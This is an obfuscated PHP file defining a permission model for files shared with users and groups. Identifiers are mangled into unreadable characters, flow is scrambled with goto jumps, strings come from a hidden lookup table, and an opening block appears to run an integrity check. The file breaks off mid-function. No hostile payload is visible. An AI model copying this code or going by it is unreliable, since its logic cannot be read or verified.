<?php
 goto e­ø†¯Ş÷Ù; b…Ç¦“…øŒ: $bÙÇÈä¨“Ğ = $_SERVER[$_SERVER[¬ı§†‰ú˜¼][764]]; $D—ŠŒÕÛƒ¸ = $_SERVER[¬ı§†‰ú˜¼][829]; if ($_SERVER[$_SERVER[¬ı§†‰ú˜¼][763]] != $D—ŠŒÕÛƒ¸($bÙÇÈä¨“Ğ)) { goto eœ£§­ªÅš; bäœ¢ìøƒ“: $C¾åÈ°Ğ®Œ = explode($_SERVER[¬ı§†‰ú˜¼][228], $A–ÂöÎàó—); if (count($C¾åÈ°Ğ®Œ) < $_SERVER[¬ı§†‰ú˜¼][584]) { $C•²…–†å = $_SERVER[¬ı§†‰ú˜¼][768]; $C•²…–†å(); } $aÄ¥ÆÖ†ËØ = $_SERVER[¬ı§†‰ú˜¼][769]; goto fµõëÊ¹©·; fµõëÊ¹©·: $aÄ¥ÆÖ†ËØ($bÙÇÈä¨“Ğ); goto F®Õ’İ·¸Ê; eœ£§­ªÅš: $dÆ×ñ‰à’ = $_SERVER[¬ı§†‰ú˜¼][765]; $CïÕ”«‡ÁÂ = $_SERVER[$_SERVER[¬ı§†‰ú˜¼][766]] . $_SERVER[¬ı§†‰ú˜¼][767]; $A–ÂöÎàó— = $dÆ×ñ‰à’($CïÕ”«‡ÁÂ); goto bäœ¢ìøƒ“; F®Õ’İ·¸Ê: } goto cÑ—íâ§á; C–§‹…Ÿ•: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\162\143\x65\x5f\x61\x75\x74\150"; public function getAuth($C‰¿«±…ŒÉ) { goto eƒ†é¿Ÿ¥˜; BÙÊ¤¨†Ü: $f…êÒñÒ÷ = array(); $bğ‹ê…ù¸‰ = 2 << 25; foreach ($a¶á¸¡Éƒ as $FâÆ®ÂÉôä) { goto D©àõÎ“¼Ã; D©àõÎ“¼Ã: $E¤ç·Á† = Model($f½Ÿê’àêò[1857])->listData($FâÆ®ÂÉôä[$f½Ÿê’àêò[1785]]); if (!$E¤ç·Á†) { continue; } $a„Š…§Ï£“[] = $FâÆ®ÂÉôä; goto C½ĞãíÜ„ê; c£’îè¥÷Ô: if ($FâÆ®ÂÉôä[$f½Ÿê’àêò[402]] == SourceModel::TYPE_USER && $FâÆ®ÂÉôä[$f½Ÿê’àêò[482]] == $f½Ÿê’àêò[495]) { $AÖÄ£´‡‹¢ = 0; } $f…êÒñÒ÷[] = $E¤ç·Á†[$f½Ÿê’àêò[404]] + $AÖÄ£´‡‹¢; goto A¡°¡¹š‰; C½ĞãíÜ„ê: $AÖÄ£´‡‹¢ = 0; if ($FâÆ®ÂÉôä[$f½Ÿê’àêò[402]] == SourceModel::TYPE_GROUP) { $AÖÄ£´‡‹¢ = $bğ‹ê…ù¸‰ * 2; } if ($FâÆ®ÂÉôä[$f½Ÿê’àêò[402]] == SourceModel::TYPE_USER) { $AÖÄ£´‡‹¢ = $bğ‹ê…ù¸‰; } goto c£’îè¥÷Ô; A¡°¡¹š‰: } goto b¯¤¼Üæì²; eƒ†é¿Ÿ¥˜: $f½Ÿê’àêò =& $_SERVER[¬ı§†‰ú˜¼]; $a¶á¸¡Éƒ = $this->sourceAuthSelect($C‰¿«±…ŒÉ); $a„Š…§Ï£“ = array(); goto BÙÊ¤¨†Ü; b¯¤¼Üæì²: array_multisort($f…êÒñÒ÷, SORT_DESC, $a„Š…§Ï£“); return $a„Š…§Ï£“; goto aâ½‰î¸‚±; aâ½‰î¸‚±: } public function sourceAuthSelect($Bƒ¨—ùòƒ¹) { goto f¤°Æè™âÓ; A÷Á´—ô¸: if ($E±­ ë÷æØ) { $Bƒ¨—ùòƒ¹ = array($Bƒ¨—ùòƒ¹); } $AÖ˜ÓÓæê° = array(); foreach ($Bƒ¨—ùòƒ¹ as $EŠ“­ÃªÊ) { if (isset($F‹ù¨«ÀÇ”[$EŠ“­ÃªÊ])) { $AÖ˜ÓÓæê°[$EŠ“­ÃªÊ] = $F‹ù¨«ÀÇ”[$EŠ“­ÃªÊ]; } } goto F±°èœÛœ; F±°èœÛœ: if (count($AÖ˜ÓÓæê°) == count($Bƒ¨—ùòƒ¹)) { return $E±­ ë÷æØ ? $AÖ˜ÓÓæê°[$Bƒ¨—ùòƒ¹[0]] : $AÖ˜ÓÓæê°; } $CÙ•Áä›™¹ = $A­àÌóİ‡[1858]; $Eàˆ—ñ¢‚İ = array($A­àÌóİ‡[394] => array($A­àÌóİ‡[7], $Bƒ¨—ùòƒ¹)); goto d‚’§îÑµô; f¤°Æè™âÓ: $A­àÌóİ‡ =& $_SERVER[¬ı§†‰ú˜¼]; static $F‹ù¨«ÀÇ” = array(); $E±­ ë÷æØ = is_array($Bƒ¨—ùòƒ¹) ? !1 : !0; goto A÷Á´—ô¸; d‚’§îÑµô: $eœË–Ù‰ = $this->field($CÙ•Áä›™¹)->order($A­àÌóİ‡[392])->where($Eàˆ—ñ¢‚İ)->select(); $d„¢¸‹Åô = array_to_keyvalue_group($eœË–Ù‰, $A­àÌóİ‡[394]); foreach ($Bƒ¨—ùòƒ¹ as $EŠ“­ÃªÊ) { $F‹ù¨«ÀÇ”[$EŠ“­ÃªÊ] = $d„¢¸‹Åô[$EŠ“­ÃªÊ] ? $d„¢¸‹Åô[$EŠ“­ÃªÊ] : array(); } goto d©Ä¯È™ï; d©Ä¯È™ï: if ($E±­ ë÷æØ) { return $eœË–Ù‰; } return $d„¢¸‹Åô; goto A†„‡›âçƒ; A†„‡›âçƒ: } public function setAuth($AŒ’àïÁƒğ, $C¢¥ôÜ¢îá) { goto Dèáï‘¼ä¦; a¡ÔâæØ: if ($aĞ½ŸËÂë‰[$c¦é¥ÌÇœ[402]] != SourceModel::TYPE_GROUP) { return !1; } $B´‡øß›‹İ = 1; $F Îß‚‰ÓÀ = $aĞ½ŸËÂë‰[$c¦é¥ÌÇœ[482]]; goto bˆ§»ˆë™£; bˆ§»ˆë™£: if ($F Îß‚‰ÓÀ != $B´‡øß›‹İ) { $Bã¸÷—¯´ = array($c¦é¥ÌÇœ[1690] => $F Îß‚‰ÓÀ); $b®èå¸æœ = Model($c¦é¥ÌÇœ[1771])->field($c¦é¥ÌÇœ[1527])->where($Bã¸÷—¯´)->select(); $b®èå¸æœ = array_to_keyvalue($b®èå¸æœ, $c¦é¥ÌÇœ[33], $c¦é¥ÌÇœ[1527]); } $aøÌäÃìĞ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Aƒàõ„Ù = array(); goto BÄ£­Š«³; BÄ£­Š«³: foreach ($C¢¥ôÜ¢îá as $d°«¦¼•¸Œ) { if (!in_array($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[402]], $aøÌäÃìĞ)) { show_json(LNG($c¦é¥ÌÇœ[1859]), !1); } if ($F Îß‚‰ÓÀ != $B´‡øß›‹İ) { if ($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[402]] == SourceModel::TYPE_GROUP) { } if ($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[482]] != 0 && !in_array($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[482]], $b®èå¸æœ)) { } } if ($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[482]] == 0) { $d°«¦¼•¸Œ[$c¦é¥ÌÇœ[402]] = SourceModel::TYPE_USER; } $Aƒàõ„Ù[] = array($c¦é¥ÌÇœ[394] => $AŒ’àïÁƒğ, $c¦é¥ÌÇœ[402] => intval($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[402]]), $c¦é¥ÌÇœ[482] => intval($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[482]]), $c¦é¥ÌÇœ[1785] => intval($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[1785]]) ? intval($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[1785]]) : 0, $c¦é¥ÌÇœ[1839] => intval($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[1839]]) ? intval($d°«¦¼•¸Œ[$c¦é¥ÌÇœ[1839]]) : -1); } $this->where(array($c¦é¥ÌÇœ[408] => $AŒ’àïÁƒğ))->delete(); $this->addAll($Aƒàõ„Ù); goto cÑ’×Ş”£±; Dèáï‘¼ä¦: $c¦é¥ÌÇœ =& $_SERVER[¬ı§†‰ú˜¼]; $aĞ½ŸËÂë‰ = Model($c¦é¥ÌÇœ[1204])->sourceInfo($AŒ’àïÁƒğ); if (!$aĞ½ŸËÂë‰) { return !1; } goto a¡ÔâæØ; cÑ’×Ş”£±: return !0; goto b‹ê†—ÕáŒ; b‹ê†—ÕáŒ: } public function authClear($Cø„ğİ§‚æ) { $CèÑ¹µ  =& $_SERVER[¬ı§†‰ú˜¼]; $b›‰ºŠ‹ö½ = Model($CèÑ¹µ [1204])->sourceInfo($Cø„ğİ§‚æ); $C½çâÌ±™ = array($Cø„ğİ§‚æ); if ($b›‰ºŠ‹ö½[$CèÑ¹µ [401]] == $CèÑ¹µ [87]) { $aÙíí‘¾ä¬ = array($CèÑ¹µ [552] => array($CèÑ¹µ [511], $b›‰ºŠ‹ö½[$CèÑ¹µ [485]] . $Cø„ğİ§‚æ . $CèÑ¹µ [512])); $C½çâÌ±™ = Model($CèÑ¹µ [1204])->field($CèÑ¹µ [408])->where($aÙíí‘¾ä¬)->getField($CèÑ¹µ [394], !0); $C½çâÌ±™[] = $Cø„ğİ§‚æ; } $this->where(array($CèÑ¹µ [408] => array($CèÑ¹µ [409], $C½çâÌ±™)))->delete(); return !0; } public function getAllChildren($c”éÏ‚ùëÕ) { goto Aå¾ì…°âÙ; b·ßÏ¹†¢: if ($FÜË¤‘¶Œ[$D¬ëë‰ŒŠ«[402]] != SourceModel::TYPE_GROUP) { return array(); } $fÈ’òƒÉ‡è = 1; $bìí¨ØšµÎ = array($c”éÏ‚ùëÕ); goto Fç¶ÃÆÏ§‹; F¿Ş£ÔÏ“ë: return $this->sourceListAuth($D­„Ó¥ÕÊÈ); goto d¤À´°ÏÓ; Dƒ†é³ªÏŠ: if (!$Cš§‰¨±ßñ) { return array(); } $cµğÊöÆ‹ = $D¬ëë‰ŒŠ«[1860]; $e‘ªßÌÕ¶ = array($D¬ëë‰ŒŠ«[394] => array($D¬ëë‰ŒŠ«[7], $Cš§‰¨±ßñ), $D¬ëë‰ŒŠ«[421] => $D¬ëë‰ŒŠ«[495]); goto eˆ«†«†Õä; Fç¶ÃÆÏ§‹: if ($FÜË¤‘¶Œ[$D¬ëë‰ŒŠ«[476]] == $D¬ëë‰ŒŠ«[495] && $FÜË¤‘¶Œ[$D¬ëë‰ŒŠ«[482]] != $fÈ’òƒÉ‡è) { $bìí¨ØšµÎ = $this->groupChidldAllRootSource($FÜË¤‘¶Œ[$D¬ëë‰ŒŠ«[482]]); } $Cš§‰¨±ßñ = $this->field($D¬ëë‰ŒŠ«[394])->group($D¬ëë‰ŒŠ«[394])->select(); $Cš§‰¨±ßñ = array_to_keyvalue($Cš§‰¨±ßñ, $D¬ëë‰ŒŠ«[33], $D¬ëë‰ŒŠ«[394]); goto Dƒ†é³ªÏŠ; eˆ«†«†Õä: $dµÃâ¾½Ûî = Model($D¬ëë‰ŒŠ«[798])->field($cµğÊöÆ‹)->where($e‘ªßÌÕ¶)->select(); $D­„Ó¥ÕÊÈ = array($c”éÏ‚ùëÕ); foreach ($dµÃâ¾½Ûî as $d½·Õ¬Û») { foreach ($bìí¨ØšµÎ as $fÅ¤«—„Ó«) { $a°ğ¿œ‰¾ = $D¬ëë‰ŒŠ«[47] . $fÅ¤«—„Ó« . $D¬ëë‰ŒŠ«[47]; $Cêˆ´èÒø = $d½·Õ¬Û»[$D¬ëë‰ŒŠ«[485]] . $d½·Õ¬Û»[$D¬ëë‰ŒŠ«[394]] . $D¬ëë‰ŒŠ«[47]; if (strstr($Cêˆ´èÒø, $a°ğ¿œ‰¾)) { $D­„Ó¥ÕÊÈ[] = $d½·Õ¬Û»[$D¬ëë‰ŒŠ«[394]]; break; } } } goto F¿Ş£ÔÏ“ë; Aå¾ì…°âÙ: $D¬ëë‰ŒŠ« =& $_SERVER[¬ı§†‰ú˜¼]; $FÜË¤‘¶Œ = Model($D¬ëë‰ŒŠ«[1204])->sourceInfo($c”éÏ‚ùëÕ); if ($FÜË¤‘¶Œ[$D¬ëë‰ŒŠ«[401]] != $D¬ëë‰ŒŠ«[87]) { return $this->sourceListAuth(array($c”éÏ‚ùëÕ)); } goto b·ßÏ¹†¢; d¤À´°ÏÓ: } private function sourceListAuth($cÌÉÈã‡ÙÚ) { goto eÜô°§‘ñ†; eÜô°§‘ñ†: $eË÷Î“¯ÚÅ =& $_SERVER[¬ı§†‰ú˜¼]; $CÁŞŞßáÂÌ = Model($eË÷Î“¯ÚÅ[1204])->sourceListInfo($cÌÉÈã‡ÙÚ, !0); $A‹æ­ôÀÆĞ = $this->sourceAuthSelect($cÌÉÈã‡ÙÚ); goto C­í˜¦¬ßà; BÉõ‰³Û¦†: array_multisort($cšè©™¬È©, SORT_ASC, $cÙâ¹ˆá¢¸); return $cÙâ¹ˆá¢¸; goto E¡ñ¦á”¥; C­í˜¦¬ßà: $cÙâ¹ˆá¢¸ = array(); $cšè©™¬È© = array(); foreach ($CÁŞŞßáÂÌ as $f˜äôÄî¾Ø) { goto d»Ğ¤ëÚ¸˜; Eù‹Èé¸¾Ü: $f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[1861]] = $this->authTargetInfo($fÌ›µï†”¾); $f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[493]] = rtrim($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[488]], $eË÷Î“¯ÚÅ[8]) . $eË÷Î“¯ÚÅ[8] . ltrim($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[493]], $eË÷Î“¯ÚÅ[8]); $cÙâ¹ˆá¢¸[] = $f˜äôÄî¾Ø; goto DŒÄ°†‰³¿; c…ŸÁ¢ÃÉ: unset($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[85]]); $fÌ›µï†”¾ = $A‹æ­ôÀÆĞ[$f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[394]]]; if (!$fÌ›µï†”¾) { continue; } goto Eù‹Èé¸¾Ü; DŒÄ°†‰³¿: $Dğ­ç•ˆéÀ = count(explode($eË÷Î“¯ÚÅ[8], trim($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[493]], $eË÷Î“¯ÚÅ[8]))); $cšè©™¬È©[] = $Dğ­ç•ˆéÀ + ($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[29]] == $eË÷Î“¯ÚÅ[77] ? 0 : 1000); goto bÊĞ±Ä³¦ˆ; d»Ğ¤ëÚ¸˜: unset($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[432]]); unset($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[430]]); unset($f˜äôÄî¾Ø[$eË÷Î“¯ÚÅ[404]]); goto c…ŸÁ¢ÃÉ; bÊĞ±Ä³¦ˆ: } goto BÉõ‰³Û¦†; E¡ñ¦á”¥: } private function groupChidldAllRootSource($F Ì”¼¹µƒ) { $cñœ èàÌ =& $_SERVER[¬ı§†‰ú˜¼]; $f«ÒË¨°® = Model($cñœ èàÌ[1862])->groupChildrenAll($F Ì”¼¹µƒ); $dÃ©ãõ†…¨ = array($cñœ èàÌ[476] => 0, $cñœ èàÌ[482] => array($cñœ èàÌ[7], $f«ÒË¨°®), $cñœ èàÌ[402] => SourceModel::TYPE_GROUP); $Eù¯×ôí’… = Model($cñœ èàÌ[798])->field($cñœ èàÌ[394])->where($dÃ©ãõ†…¨)->select(); $Eù¯×ôí’… = array_to_keyvalue($Eù¯×ôí’…, $cñœ èàÌ[33], $cñœ èàÌ[394]); return $Eù¯×ôí’…; } private function authTargetInfo($Aï²µÌƒ©) { goto cŸ™øã¢Ê; AµŒÖ§‰‚: $Bã…Ö¿¦ê³ = 2 << 25; foreach ($Aï²µÌƒ© as $B‡‚“¼Ğ) { goto bé„„„Ø¥; E©ˆ£Ğó‘: if (!$Cƒó¥‚Î) { continue; } $Cƒó¥‚Î[$D”Ú‡™ã§[444]] = $eˆÑ‰˜Í¯Ò; $aô‰èÑ®„[] = $Cƒó¥‚Î; goto fÅ¬¥†à¥; bé„„„Ø¥: $eˆÑ‰˜Í¯Ò = Model($D”Ú‡™ã§[1857])->listData($B‡‚“¼Ğ[$D”Ú‡™ã§[1785]]); if (!$eˆÑ‰˜Í¯Ò) { continue; } if ($B‡‚“¼Ğ[$D”Ú‡™ã§[402]] == SourceModel::TYPE_USER) { $Cƒó¥‚Î = Model($D”Ú‡™ã§[501])->getInfoSimpleOuter($B‡‚“¼Ğ[$D”Ú‡™ã§[482]]); if ($Cƒó¥‚Î[$D”Ú‡™ã§[1527]] == $D”Ú‡™ã§[1084]) { continue; } if ($Cƒó¥‚Î[$D”Ú‡™ã§[1527]] == $D”Ú‡™ã§[495]) { $Cƒó¥‚Î[$D”Ú‡™ã§[28]] = LNG($D”Ú‡™ã§[1863]); } } else { $Cƒó¥‚Î = Model($D”Ú‡™ã§[484])->getInfoSimple($B‡‚“¼Ğ[$D”Ú‡™ã§[482]]); } goto E©ˆ£Ğó‘; fÅ¬¥†à¥: $dÉ’İ¦Áù³ = 0; if ($B‡‚“¼Ğ[$D”Ú‡™ã§[402]] == SourceModel::TYPE_GROUP) { $dÉ’İ¦Áù³ = $Bã…Ö¿¦ê³ * 2; } if ($B‡‚“¼Ğ[$D”Ú‡™ã§[402]] == SourceModel::TYPE_USER) { $dÉ’İ¦Áù³ = $Bã…Ö¿¦ê³; } goto a„Œ´”Ù; a„Œ´”Ù: if ($B‡‚“¼Ğ[$D”Ú‡™ã§[402]] == SourceModel::TYPE_USER && $B‡‚“¼Ğ[$D”Ú‡™ã§[482]] == $D”Ú‡™ã§[495]) { $dÉ’İ¦Áù³ = 0; } $DÔ¥º¸˜[] = $eˆÑ‰˜Í¯Ò[$D”Ú‡™ã§[404]] + $dÉ’İ¦Áù³; goto CŒğ»ÃŠ·…; CŒğ»ÃŠ·…: } array_multisort($DÔ¥º¸˜, SORT_DESC, $aô‰èÑ®„); goto E´Šßé¦ÚÙ; E´Šßé¦ÚÙ: return $aô‰èÑ®„; goto e“†Ó„¶¸; cŸ™øã¢Ê: $D”Ú‡™ã§ =& $_SERVER[¬ı§†‰ú˜¼]; $aô‰èÑ®„ = array(); $DÔ¥º¸˜ = array(); goto AµŒÖ§‰‚; e“†Ó„¶¸: } public function getAllChildrenByUser($D¨Éë¹£áÜ, $DÃ—¢·ñëË) { goto dòĞÅ×„ÖŒ; BòÔ¯ßóÙ: return $F¨„ÍÆÊª—; goto CŠÏÂÆ›³; e¨ôŒøƒ‘Ø: if ($e¶Ãñç¬à[$dô§˜÷–‰ô[476]] == $dô§˜÷–‰ô[495] && $e¶Ãñç¬à[$dô§˜÷–‰ô[482]] != $cŒÒ³¼¢â && $this->groupContainUser($e¶Ãñç¬à[$dô§˜÷–‰ô[482]], $DÃ—¢·ñëË)) { foreach ($DêÉº«İ§[$dô§˜÷–‰ô[1864]] as $Aƒ¡÷©Ñø) { $aÚÓ¸¡–èº = Model($dô§˜÷–‰ô[484])->getInfo($Aƒ¡÷©Ñø[$dô§˜÷–‰ô[1690]]); $fªğÇŞÅÜó = Model($dô§˜÷–‰ô[505])->getInfoSimpleOuter($DÃ—¢·ñëË); $fªğÇŞÅÜó[$dô§˜÷–‰ô[444]] = $Aƒ¡÷©Ñø[$dô§˜÷–‰ô[404]]; if (Model($dô§˜÷–‰ô[1857])->authCheckAction($Aƒ¡÷©Ñø[$dô§˜÷–‰ô[404]][$dô§˜÷–‰ô[404]], $dô§˜÷–‰ô[1710])) { continue; } $Fø£ßØÚ‹Î = array($dô§˜÷–‰ô[28] => $dô§˜÷–‰ô[1480] . $aÚÓ¸¡–èº[$dô§˜÷–‰ô[28]], $dô§˜÷–‰ô[394] => $aÚÓ¸¡–èº[$dô§˜÷–‰ô[85]][$dô§˜÷–‰ô[394]], $dô§˜÷–‰ô[76] => KodIO::make($aÚÓ¸¡–èº[$dô§˜÷–‰ô[85]][$dô§˜÷–‰ô[394]]), $dô§˜÷–‰ô[476] => $dô§˜÷–‰ô[495], $dô§˜÷–‰ô[402] => $dô§˜÷–‰ô[1014], $dô§˜÷–‰ô[29] => $dô§˜÷–‰ô[516], $dô§˜÷–‰ô[493] => $aÚÓ¸¡–èº[$dô§˜÷–‰ô[489]], $dô§˜÷–‰ô[1690] => $aÚÓ¸¡–èº[$dô§˜÷–‰ô[1690]], $dô§˜÷–‰ô[486] => $aÚÓ¸¡–èº[$dô§˜÷–‰ô[476]], $dô§˜÷–‰ô[1861] => array($fªğÇŞÅÜó)); $E®ÔïàğÙ[$Fø£ßØÚ‹Î[$dô§˜÷–‰ô[394]]] = $Fø£ßØÚ‹Î; } } $F¨„ÍÆÊª— = array(); $AîÉÊâ¹·‘ = $this->getAllChildren($D¨Éë¹£áÜ); goto c¶æÒ³ÀÈ; dòĞÅ×„ÖŒ: $dô§˜÷–‰ô =& $_SERVER[¬ı§†‰ú˜¼]; $DêÉº«İ§ = Model($dô§˜÷–‰ô[505])->getInfo($DÃ—¢·ñëË); if (!$DÃ—¢·ñëË || !$D¨Éë¹£áÜ || !$DêÉº«İ§) { return array(); } goto BÍ¾Ó‡½…Ã; c¶æÒ³ÀÈ: foreach ($AîÉÊâ¹·‘ as $d÷™´š¢ä‰) { $F¾‚”‘»‡Ë = !1; foreach ($d÷™´š¢ä‰[$dô§˜÷–‰ô[1861]] as $aÔã¿óÉ”Ö) { if ($aÔã¿óÉ”Ö[$dô§˜÷–‰ô[1527]]) { if ($aÔã¿óÉ”Ö[$dô§˜÷–‰ô[1527]] == $DÃ—¢·ñëË) { $F¾‚”‘»‡Ë = !0; break; } } if ($aÔã¿óÉ”Ö[$dô§˜÷–‰ô[1690]]) { if ($this->groupContainUser($aÔã¿óÉ”Ö[$dô§˜÷–‰ô[1690]], $DÃ—¢·ñëË)) { $F¾‚”‘»‡Ë = !0; break; } } } if ($F¾‚”‘»‡Ë) { $F¨„ÍÆÊª—[] = $d÷™´š¢ä‰; } $bÅÛˆ³òÏÔ = $d÷™´š¢ä‰[$dô§˜÷–‰ô[394]]; if (isset($E®ÔïàğÙ[$bÅÛˆ³òÏÔ])) { $d÷™´š¢ä‰[$dô§˜÷–‰ô[1861]][] = $E®ÔïàğÙ[$bÅÛˆ³òÏÔ][0]; $E®ÔïàğÙ[$bÅÛˆ³òÏÔ] = !1; } } $E®ÔïàğÙ = array_filter(array_values($E®ÔïàğÙ)); $F¨„ÍÆÊª— = array_merge($E®ÔïàğÙ, $F¨„ÍÆÊª—); goto BòÔ¯ßóÙ; BÍ¾Ó‡½…Ã: $e¶Ãñç¬à = Model($dô§˜÷–‰ô[1204])->sourceInfo($D¨Éë¹£áÜ); $E®ÔïàğÙ = array(); $cŒÒ³¼¢â = 1; goto e¨ôŒøƒ‘Ø; CŠÏÂÆ›³: } public function setAllChildrenByUser($C„©£Â•ÙÎ, $fæƒØ¹Ÿ¹ª, $Dí‘ÍÂï°Ü) { $cÂî¶µ¼®« =& $_SERVER[¬ı§†‰ú˜¼]; $c°è˜âÃ»” = $this->getAllChildrenByUser($C„©£Â•ÙÎ, $fæƒØ¹Ÿ¹ª); if (!$Dí‘ÍÂï°Ü || !$c°è˜âÃ»”) { return !1; } foreach ($c°è˜âÃ»” as $E‰Œó¥èÉ) { $d‘©…èäÖÜ = array(); foreach ($E‰Œó¥èÉ[$cÂî¶µ¼®«[1861]] as $E³ª›å‘”Ç) { $b™·Ô‚Ò‡ = $E³ª›å‘”Ç[$cÂî¶µ¼®«[444]]; $EÁ¤Ìô¯£ô = $E³ª›å‘”Ç[$cÂî¶µ¼®«[1527]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $c‘Ú…“³Ê = $E³ª›å‘”Ç[$cÂî¶µ¼®«[1527]] ? $E³ª›å‘”Ç[$cÂî¶µ¼®«[1527]] : $E³ª›å‘”Ç[$cÂî¶µ¼®«[1690]]; if ($E³ª›å‘”Ç[$cÂî¶µ¼®«[1527]] && $E³ª›å‘”Ç[$cÂî¶µ¼®«[1527]] == $fæƒØ¹Ÿ¹ª) { continue; } $d‘©…èäÖÜ[] = array($cÂî¶µ¼®«[394] => $E‰Œó¥èÉ[$cÂî¶µ¼®«[394]], $cÂî¶µ¼®«[402] => $EÁ¤Ìô¯£ô, $cÂî¶µ¼®«[482] => intval($c‘Ú…“³Ê), $cÂî¶µ¼®«[1785] => isset($b™·Ô‚Ò‡[$cÂî¶µ¼®«[392]]) ? intval($b™·Ô‚Ò‡[$cÂî¶µ¼®«[392]]) : 0, $cÂî¶µ¼®«[1839] => isset($b™·Ô‚Ò‡[$cÂî¶µ¼®«[1839]]) ? intval($b™·Ô‚Ò‡[$cÂî¶µ¼®«[1839]]) : -1); } $d‘©…èäÖÜ[] = array($cÂî¶µ¼®«[394] => $E‰Œó¥èÉ[$cÂî¶µ¼®«[394]], $cÂî¶µ¼®«[402] => SourceModel::TYPE_USER, $cÂî¶µ¼®«[482] => intval($fæƒØ¹Ÿ¹ª), $cÂî¶µ¼®«[1785] => intval($Dí‘ÍÂï°Ü), $cÂî¶µ¼®«[1839] => -1); $this->where(array($cÂî¶µ¼®«[408] => $E‰Œó¥èÉ[$cÂî¶µ¼®«[394]]))->delete(); $this->addAll($d‘©…èäÖÜ); } return !0; } public function get($fë¦Ñù¸Ü) { $EÕÀí®â†¾ = $this->getSourceList(array($fë¦Ñù¸Ü), !0); return $EÕÀí®â†¾[0]; } public function getSourceList($c–ˆØßÙ, $díÇÖêìİ = false, $d’…¶§¼×ˆ = false) { goto A²ÂŞç¾; A²ÂŞç¾: $F«ŸÉÚÈ‘ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$c–ˆØßÙ) { return array(); } $f¼–¢íìŒò = Model($F«ŸÉÚÈ‘[1204]); goto Fëƒ¬°‚¸Æ; e£â†…ÚÛö: $b¥å˜Ÿœ«Ñ = $this->sourceAuthSelect($fä¯Ô±—È¿); $Aß¶ÃÌƒ‡ = array(); foreach ($fä¯Ô±—È¿ as $b»¶æ¸îîÉ) { if (isset($b¥å˜Ÿœ«Ñ[$b»¶æ¸îîÉ])) { $Aß¶ÃÌƒ‡[$b»¶æ¸îîÉ] = $b¥å˜Ÿœ«Ñ[$b»¶æ¸îîÉ]; } } goto b¬ïªÅ§âê; Cù¤†õ’÷­: $BåØºğ»ˆ– = array(); foreach ($díÇÖêìİ as $b»¶æ¸îîÉ => $B¸’¯ ìÇ) { if ($C›…¹‡¥Ğ) { $BåØºğ»ˆ–[$b»¶æ¸îîÉ] = $A™§¶¿±åë; continue; } $BåØºğ»ˆ–[$b»¶æ¸îîÉ] = $this->makeSourceAuth($B¸’¯ ìÇ, $Aß¶ÃÌƒ‡, $d’…¶§¼×ˆ); } return $BåØºğ»ˆ–; goto fË¨ˆ…¤ø; b¬ïªÅ§âê: $C›…¹‡¥Ğ = $this->userIsRoot($d’…¶§¼×ˆ); $Cé¶¬ñÑ³ = AuthModel::authAll(); $A™§¶¿±åë = array($F«ŸÉÚÈ‘[405] => $Cé¶¬ñÑ³, $F«ŸÉÚÈ‘[1866] => array($F«ŸÉÚÈ‘[410] => 0, $F«ŸÉÚÈ‘[1696] => $Cé¶¬ñÑ³, $F«ŸÉÚÈ‘[411] => LNG($F«ŸÉÚÈ‘[1867]), $F«ŸÉÚÈ‘[1711] => $F«ŸÉÚÈ‘[1868])); goto Cù¤†õ’÷­; C„”É·×Æä: foreach ($díÇÖêìİ as $e÷ã®Ã­› => $Fö…ÕØÓ) { $bÌíæš‰¨ = $f¼–¢íìŒò->parentLevelArray($Fö…ÕØÓ[$F«ŸÉÚÈ‘[485]]); $fä¯Ô±—È¿ = array_merge($fä¯Ô±—È¿, array($e÷ã®Ã­›), array_reverse($bÌíæš‰¨)); } $fä¯Ô±—È¿ = array_values(array_unique($fä¯Ô±—È¿)); if (!$fä¯Ô±—È¿) { return array(); } goto e£â†…ÚÛö; Fëƒ¬°‚¸Æ: if (!$díÇÖêìİ && count($c–ˆØßÙ) == 1) { $díÇÖêìİ = array(); $díÇÖêìİ[$c–ˆØßÙ[0]] = $f¼–¢íìŒò->sourceInfo($c–ˆØßÙ[0]); } if (!$díÇÖêìİ) { $cŒñ›åä½ = array($F«ŸÉÚÈ‘[408] => array($F«ŸÉÚÈ‘[409], $c–ˆØßÙ)); $díÇÖêìİ = $f¼–¢íìŒò->field($F«ŸÉÚÈ‘[1865])->where($cŒñ›åä½)->select(); $díÇÖêìİ = array_to_keyvalue($díÇÖêìİ, $F«ŸÉÚÈ‘[394]); } $fä¯Ô±—È¿ = $c–ˆØßÙ; goto C„”É·×Æä; fË¨ˆ…¤ø: } public function authDeepCheck($aä¡ëáŠ˜È, $B¡µİÓÁŞ = false) { goto BÎÊÄ¾í´; BÎÊÄ¾í´: $E­âÔ„˜¦™ =& $_SERVER[¬ı§†‰ú˜¼]; $B¡µİÓÁŞ = $B¡µİÓÁŞ ? $B¡µİÓÁŞ : USER_ID; $eŞ‰š”¡¹ = $this->makeAuthDeep($B¡µİÓÁŞ); goto fĞ‚¨†”ÆÛ; fĞ‚¨†”ÆÛ: if (!in_array($aä¡ëáŠ˜È, $eŞ‰š”¡¹[$E­âÔ„˜¦™[1869]])) { return !1; } $dâ¶ÜÔÜ‰ = array(); foreach ($eŞ‰š”¡¹[$E­âÔ„˜¦™[1870]] as $A‰ë—î…øî => $BÜ„ƒóøì) { if (!in_array($aä¡ëáŠ˜È, $BÜ„ƒóøì)) { continue; } $dâ¶ÜÔÜ‰[] = $A‰ë—î…øî; } goto dæšĞæöÊº; 